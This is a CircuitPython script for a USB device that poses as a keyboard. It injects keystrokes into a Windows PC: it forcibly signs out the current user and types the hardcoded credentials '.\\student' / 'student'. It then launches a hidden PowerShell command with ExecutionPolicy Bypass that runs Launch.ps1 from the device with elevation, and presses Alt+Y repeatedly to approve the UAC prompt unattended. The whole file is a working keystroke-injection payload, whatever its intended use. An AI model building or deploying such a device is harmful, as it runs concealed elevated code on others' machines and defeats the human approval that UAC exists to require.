import time
import gc
import board
import digitalio
import usb_hid

# --- SAFETY DELAY ---
# Wait for Windows to finish mounting the drive and settling autoplay
time.sleep(8.0)

# --- MEMORY CLEANUP ---
gc.collect()

# --- IMPORT HID DRIVERS ---
try:
    from adafruit_hid.keyboard import Keyboard
    from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
    from adafruit_hid.keycode import Keycode
except ImportError:
    while True:
        time.sleep(0.1)

# --- LED SETUP ---
led_pin = board.LED if hasattr(board, "LED") else (board.GP25 if hasattr(board, "GP25") else board.GP23)
led = digitalio.DigitalInOut(led_pin)
led.direction = digitalio.Direction.OUTPUT

# --- HID SETUP ---
try:
    kbd = Keyboard(usb_hid.devices)
    layout = KeyboardLayoutUS(kbd)
except Exception:
    while True:
        led.value = not led.value
        time.sleep(0.15)

# --- PAYLOAD ---
led.value = True

# 1. Minimize all windows so the desktop has focus for Win+R
kbd.press(Keycode.GUI, Keycode.D)
time.sleep(0.1)
kbd.release_all()
time.sleep(1.0)

# 2. Open Run dialog and sign out the current user.
#    Win+L only locks to the current user's session — entering credentials
#    there would try to unlock that user, not sign in as .\student.
#    shutdown /l fully signs out so the main Windows sign-in screen appears,
#    where .\student can be entered as a new session.
#
#    NOTE: this device assumes someone is already logged in. If the PC is
#    already at the sign-in screen, plug in the device only after a user
#    has logged in, or sign in to .\student manually.
kbd.press(Keycode.GUI, Keycode.R)
time.sleep(0.1)
kbd.release_all()
time.sleep(1.5)

layout.write("shutdown /l")
kbd.press(Keycode.ENTER)
time.sleep(0.1)
kbd.release_all()

# 3. Wait for sign-out to complete and the sign-in screen to appear
time.sleep(7.0)

# 4. Dismiss any UI overlay and ensure we are at the sign-in credential input.
#    On domain-joined PCs the sign-in screen defaults to an "Other user" field
#    (username + password) after a full sign-out, which accepts .\student.
kbd.press(Keycode.ESCAPE)
time.sleep(0.1)
kbd.release_all()
time.sleep(1.0)

# 5. Type username
layout.write(".\\student")

# 6. Move to password field
kbd.press(Keycode.TAB)
time.sleep(0.1)
kbd.release_all()
time.sleep(0.3)

# 7. Type password
layout.write("student")

# 8. Submit
kbd.press(Keycode.ENTER)
time.sleep(0.1)
kbd.release_all()

# 9. Wait for login and desktop to settle before triggering the launch script
time.sleep(10.0)

# 10. Minimize all windows so Run dialog opens cleanly
kbd.press(Keycode.GUI, Keycode.D)
time.sleep(0.1)
kbd.release_all()
time.sleep(1.0)

# 11. Open Run dialog
kbd.press(Keycode.GUI, Keycode.R)
time.sleep(0.1)
kbd.release_all()
time.sleep(1.5)

# 12. Type the launch command (chunked to avoid MemoryError)
#     Ctrl+Shift+Enter (step 13) runs this elevated — one UAC prompt total.
layout.write("powershell -W Hidden -ExecutionPolicy Bypass -C \"")
layout.write("& ((Get-Volume -FileSystemLabel 'CIRCUITPY').DriveLetter+':\\ROOT\\Launch.ps1')\"")

# 13. Elevated launch via Ctrl+Shift+Enter → triggers UAC
time.sleep(0.5)
kbd.press(Keycode.LEFT_CONTROL, Keycode.LEFT_SHIFT, Keycode.ENTER)
time.sleep(0.1)
kbd.release_all()

# 14. Accept UAC — first attempt at 1.5 s (UAC appears within ~1 s),
#     then 3 more attempts at 2.5 s apart in case of slow render.
#     Extra presses after dismissal land on a hidden window and are harmless.
time.sleep(1.5)
kbd.press(Keycode.ALT, Keycode.Y)
time.sleep(0.1)
kbd.release_all()
for _ in range(3):
    time.sleep(2.5)
    kbd.press(Keycode.ALT, Keycode.Y)
    time.sleep(0.1)
    kbd.release_all()

led.value = False
